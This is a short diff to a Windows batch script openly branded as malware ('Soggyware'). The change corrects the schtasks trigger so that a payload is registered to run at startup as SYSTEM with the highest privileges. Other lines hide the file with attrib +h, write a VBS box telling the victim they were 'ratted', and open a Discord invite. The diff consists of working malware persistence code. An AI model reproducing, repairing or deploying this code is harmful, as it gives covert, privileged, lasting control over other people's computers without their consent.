@@ -40,7 +40,7 @@ if /i "%iwr%"=="Y" (
         timeout /t 1 >nul
         exit /b
     )
-    schtasks /create /tn "%malware%" /tr "%fullfilepath%" /sc onstartup /rl highest /ru SYSTEM /f
+    schtasks /create /tn "%malware%" /tr "%fullfilepath%" /sc ONSTART /rl highest /ru SYSTEM /f
     if errorlevel==0 (
         echo Successfully added to scheduled taskss
         attrib +h "!fileloc!" 
@@ -72,7 +72,7 @@ timeout /t 1 >nul
 :: creates a vbs file that just shows a message box.
 :: change it however you want, this is just an example.
 echo MsgBox "Soggyware ratted you gang.", 16 + 3 + 4096, "Soggyware" >> "%fileloc%\%malware%.vbs"
-schtasks /create /tn "%malware%" /tr "%fullfilepath%" /sc onstartup /ru SYSTEM /rl highest /f
+schtasks /create /tn "%malware%" /tr "%fullfilepath%" /sc ONSTART /ru SYSTEM /rl highest /f
 start "" "%fileloc%\%malware%.vbs"
 echo thank you for choosing soggware. come again soon
 start "" https://discord.com/invite/29uepW58st
